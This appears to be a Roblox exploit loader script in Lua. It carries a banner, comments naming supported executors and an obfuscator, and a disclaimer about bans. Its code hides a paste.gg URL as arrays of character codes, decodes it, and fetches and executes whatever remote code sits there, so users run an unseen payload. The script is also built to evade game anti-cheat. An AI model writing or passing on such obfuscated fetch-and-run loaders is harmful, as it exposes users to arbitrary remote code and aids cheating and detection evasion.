--.dP"Y8 Yb        dP    db    88""Yb   88   88 88b 88 88 Yb    dP 888888 88""Yb .dP"Y8    db    88     
--`Ybo."  Yb  db  dP    dPYb   88__dP   88   88 88Yb88 88  Yb  dP  88__   88__dP `Ybo."   dPYb   88     
--o.`Y8b   YbdPYbdP    dP__Yb  88"""    Y8   8P 88 Y88 88   YbdP   88""   88"Yb  o.`Y8b  dP__Yb  88  .o 
--8bodP'    YP  YP    dP""""Yb 88       `YbodP' 88  Y8 88    YP    888888 88  Yb 8bodP' dP""""Yb 88ood8 

              --Credits : Tencent 
              --Licensed : API Sortex.  Thanks Yall For Support This Script
              --Support : Vega x , Delta x , Evon , Arceus x , Code x and others 
              --Support (PC) : Synpase Z , Wave , Rebel , ignite . (Some Executors Not supported Moonsec)
              --Obsfucator : Moonsec V3
              --WARNING : im not responsible for this script using or Banned Account (Sometimes Gui can Be Dectected or Patched will switch to another)
              --This Script protect to not being Patches
local a = {104, 116, 116, 112, 115, 58, 47, 47}
local b = {112, 97, 115, 116, 101, 46, 103, 103, 47}
local c = {112, 47, 115, 111, 114, 120, 46, 47}
local d = {54, 48, 49, 54, 53, 99, 98, 55, 51, 51, 54, 48, 52, 51, 99, 49, 98, 49, 51, 98, 101, 99, 52, 99, 55, 49, 53, 97, 51, 57, 99, 55, 47}
local e = {102, 105, 108, 101, 115, 47}
local f = {51, 57, 56, 99, 99, 57, 50, 102, 49, 50, 54, 99, 52, 54, 50, 100, 57, 100, 51, 102, 99, 56, 54, 56, 52, 50, 100, 101, 98, 52, 49, 101, 47}
local g = {114, 97, 119}

local function decode(t)
    local s = ""
    for _, v in ipairs(t) do
        s = s .. string.char(v)
    end
    return s
end

local url = decode(a) .. decode(b) .. decode(c) .. decode(d) .. decode(e) .. decode(f) .. decode(g)
loadstring(game:HttpGet(url))()
